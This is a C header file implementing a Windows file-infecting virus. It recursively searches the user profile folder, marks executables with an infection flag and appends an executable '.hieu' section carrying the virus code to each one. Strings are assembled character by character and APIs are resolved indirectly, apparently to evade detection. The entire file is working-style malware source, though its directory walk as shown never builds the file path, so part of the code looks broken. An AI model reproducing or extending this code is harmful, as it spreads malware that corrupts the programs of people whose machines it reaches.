#pragma once

#include "ulti/everything.h"
#include "pe/pe.h"

BYTE WINAPI IsVirusExistedInFile(const PVOID file_data);

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);
PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD size, const PDATA data);

void WINAPI InfectUserProfile(const PDATA data);
void WINAPI FindFile(PSTR directory, const PDATA data);
void WINAPI InfectFile(PSTR file_name, const PDATA data);

BYTE WINAPI IsVirusExistedInFile(const PVOID file_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS32 p_image_nt_headers;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;
    p_image_nt_headers = (PIMAGE_NT_HEADERS32)((PUCHAR)file_data + p_image_dos_header->e_lfanew);

    if (Is64BitExecutable(file_data))
    {
        return ((PIMAGE_NT_HEADERS64)p_image_nt_headers)->OptionalHeader.LoaderFlags == VIRUS_FLAG;
    }
    else
    {
        return p_image_nt_headers->OptionalHeader.LoaderFlags == VIRUS_FLAG;
    }

}

PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD section_size, const PDATA data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_SECTION_HEADER p_image_section_header;

    DWORD file_alignment, section_alignment;
    ULONG i;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;
    if (Is64BitExecutable(file_data))
    {
        PIMAGE_NT_HEADERS64 p_image_nt_headers_64;
        p_image_nt_headers_64 = (PIMAGE_NT_HEADERS64)((PUCHAR)file_data + p_image_dos_header->e_lfanew);
        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_64 + 1);
        i = p_image_nt_headers_64->FileHeader.NumberOfSections;
        file_alignment = p_image_nt_headers_64->OptionalHeader.FileAlignment;
        section_alignment = p_image_nt_headers_64->OptionalHeader.SectionAlignment;
        p_image_nt_headers_64->FileHeader.NumberOfSections++;
        p_image_nt_headers_64->OptionalHeader.SizeOfImage = Align(Align(
        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize, section_alignment) + section_size, section_alignment);
        p_image_nt_headers_64->OptionalHeader.CheckSum = 0;
        p_image_nt_headers_64->OptionalHeader.LoaderFlags = VIRUS_FLAG;

    }
    else
    {
        PIMAGE_NT_HEADERS32 p_image_nt_headers_32;
        p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)file_data + p_image_dos_header->e_lfanew);
        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_32 + 1);
        i = p_image_nt_headers_32->FileHeader.NumberOfSections;
        file_alignment = p_image_nt_headers_32->OptionalHeader.FileAlignment;
        section_alignment = p_image_nt_headers_32->OptionalHeader.SectionAlignment;
        p_image_nt_headers_32->FileHeader.NumberOfSections++;
        p_image_nt_headers_32->OptionalHeader.SizeOfImage = Align(Align(
        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize, section_alignment) + section_size, section_alignment);
        p_image_nt_headers_32->OptionalHeader.CheckSum = 0;
        p_image_nt_headers_32->OptionalHeader.LoaderFlags = VIRUS_FLAG;
    }

    ZeroMem(&p_image_section_header[i], sizeof(IMAGE_SECTION_HEADER));

    p_image_section_header[i].Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA;

    *(DWORD*)file_size = Align(*(DWORD*)file_size, file_alignment);

    p_image_section_header[i].PointerToRawData = *(DWORD*)file_size;

    p_image_section_header[i].SizeOfRawData = Align(
        section_size,
        file_alignment);

    p_image_section_header[i].VirtualAddress = Align(
        p_image_section_header[i - 1].VirtualAddress + p_image_section_header[i - 1].Misc.VirtualSize,
        section_alignment
    );

    p_image_section_header[i].Misc.VirtualSize = section_size;

    p_image_section_header[i].Name[0] = '.'; 
    p_image_section_header[i].Name[1] = 'h'; 
    p_image_section_header[i].Name[2] = 'i'; 
    p_image_section_header[i].Name[3] = 'e'; 
    p_image_section_header[i].Name[4] = 'u'; 
    p_image_section_header[i].Name[5] = 0; 
    p_image_section_header[i].Name[6] = 0; 
    p_image_section_header[i].Name[7] = 0;

    MemCopy((unsigned char *)file_data + p_image_section_header[i].PointerToRawData, section_data, section_size);

    return &p_image_section_header[i];
}

void WINAPI FindFile(PSTR directory, const PDATA data)
{
    HANDLE handle_find;
    WIN32_FIND_DATAA find_data;

    char search_name[1028], full_path[1024];
 
    ZeroMem(search_name, sizeof(search_name));
    ZeroMem(&find_data, sizeof(WIN32_FIND_DATAA));

    for (int i = 0; i < 1024; i++)
    {
        search_name[i] = directory[i];
        if (directory[i] == 0)
        {
            search_name[i] = '\\';
            search_name[i+1] = '*';
            search_name[i+2] = '\0';
            break;
        }
    }

    handle_find  =  data->iat->fnFindFirstFileA(search_name, &find_data);

    if(handle_find != INVALID_HANDLE_VALUE)
    {
        while(data->iat->fnFindNextFileA(handle_find, &find_data) && data->end_virus == 0)
        {
            if(find_data.cFileName[0] == '.')
            {
                continue;
            }
             
            ZeroMem(full_path,sizeof(full_path));
 
            if(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                FindFile(full_path, data);
            }
            else
            {
                InfectFile(full_path, data);
            }
        }
        data->iat->fnFindClose(handle_find);
    }
}

void WINAPI InfectUserProfile(const PDATA data)
{
    //InfectFile((PSTR)"E:\\Code\\C++\\1.exe", data);
    //return;
    char user_profile[1024];
    char user_profile_str[12];
    user_profile_str[0] = 'u'; 
    user_profile_str[1] = 's'; 
    user_profile_str[2] = 'e'; 
    user_profile_str[3] = 'r'; 
    user_profile_str[4] = 'p'; 
    user_profile_str[5] = 'r'; 
    user_profile_str[6] = 'o'; 
    user_profile_str[7] = 'f'; 
    user_profile_str[8] = 'i'; 
    user_profile_str[9] = 'l'; 
    user_profile_str[10] = 'e'; 
    user_profile_str[11] = 0;
    data->iat->fnGetEnvironmentVariableA(user_profile_str, user_profile, sizeof(user_profile));
    FindFile(user_profile, data);
}

void WINAPI InfectFile(PSTR file_name, PDATA data)
{
    HANDLE handle_file;
    HANDLE handle_mapped_file;
    PVOID mapped_file_address;
    ULONG file_size, new_file_size, bytes_read;
    PVOID file_data = NULL;
    DWORD number_of_bytes_written = 0;

    handle_file = data->iat->fnCreateFileA(
        file_name, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL,
        OPEN_EXISTING,
        0,NULL
    );

    if (handle_file == INVALID_HANDLE_VALUE)
    {
        goto END_FUNCTION;
    }

    file_size = data->iat->fnGetFileSize(handle_file, NULL);
    new_file_size = file_size;
    
    file_data = data->iat->fnVirtualAlloc(
        NULL, 
        file_size + 0x1000000, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!file_data)
    {
        goto END_FUNCTION;
    }

    if (!data->iat->fnReadFile(handle_file, file_data, file_size, &bytes_read, NULL))
    {
        goto END_FUNCTION;
    }

    if (!IsValidExeFile(file_data) || IsVirusExistedInFile(file_data))
    {
        goto END_FUNCTION;
    }

    AddVirusToFile(file_data, file_size, data, &new_file_size);

    handle_mapped_file = data->iat->fnCreateFileMappingA(handle_file, NULL, PAGE_READWRITE, 0, new_file_size, NULL);
    if (!handle_mapped_file)
    {
        goto END_FUNCTION;
    }

    mapped_file_address = data->iat->fnMapViewOfFile(handle_mapped_file, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    MemCopy(mapped_file_address, file_data, new_file_size);
    
    data->iat->fnFlushViewOfFile(mapped_file_address,0);
    data->iat->fnUnmapViewOfFile(mapped_file_address);
    data->iat->fnCloseHandle(handle_mapped_file);

    END_FUNCTION:
    if (handle_file != NULL)
    {
        data->iat->fnCloseHandle(handle_file);
    }
    if (file_data != NULL)
    {
        data->iat->fnVirtualFree(file_data, 0, MEM_RELEASE);
    }
    return;
} 
